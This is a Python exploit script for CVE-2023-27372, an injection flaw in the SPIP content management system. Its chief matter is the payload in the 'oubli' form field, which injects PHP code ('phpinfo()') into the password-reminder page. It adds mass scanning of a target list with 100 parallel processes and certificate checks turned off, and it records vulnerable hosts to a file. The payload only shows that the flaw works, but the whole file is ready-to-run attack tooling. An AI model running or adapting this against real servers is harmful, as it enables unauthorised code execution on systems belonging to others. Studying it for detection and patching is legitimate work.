import requests,argparse,sys
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
_____________   _______________         _______________   ________  ________           __________________________________________  
\_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \ \_____  \          \_____  \______  \_____  \______  \_____  \ 
/    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/   _(__  <   ______  /  ____/   /    / _(__  <   /    //  ____/ 
\     \____\     /   |        \ /_____/ /       \  \_/   \/       \  /       \ /_____/ /       \  /    / /       \ /    //       \ 
 \______  / \___/   /_______  /         \_______ \_____  /\_______ \/______  /         \_______ \/____/ /______  //____/ \_______ \
        \/                  \/                  \/     \/         \/       \/                  \/              \/                \/

author:inviewp          data:2024.9.2
version:1.0
    """
    print(test)

def main():
    banner()
    url_line = []
    parser = argparse.ArgumentParser(description='CVE-2023-27372')
    parser.add_argument('-u','--url',dest='url',type=str,help='please enter url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please enter file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_line.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_line)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

def poc(target):
    api = '/spip/spip.php?page=spip_pass'
    headers = {
        "User-Agent": "Mozilla/4.0(Mozilla/4.0;MSIE7.0;WindowsNT5.1;FDM;SV1;.NETCLR3.0.04506.30)",
        "Accept-Encoding": "gzip,deflate",
        "Accept": "*/*",
        "Connection": "close",
        "Cookie": "cibcInit=oui",
        "Content-Length": "215",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = 'page=spip_pass&formulaire_action=oubli&formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&oubli=s:19:"<?php phpinfo(); ?>";&nobot='
    try:
        res = requests.post(url=target+api, headers=headers, data=data, verify=False, timeout=10)
        if res.status_code == 200 and 'phpinfo()' in res.text and 'oubli' in res.text:
            print(f'[+]{target}存在漏洞')
            with open('CVE-2023-27372.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except Exception as e:
        print(f'[*]{target}连接错误')

if __name__ == '__main__':
    main()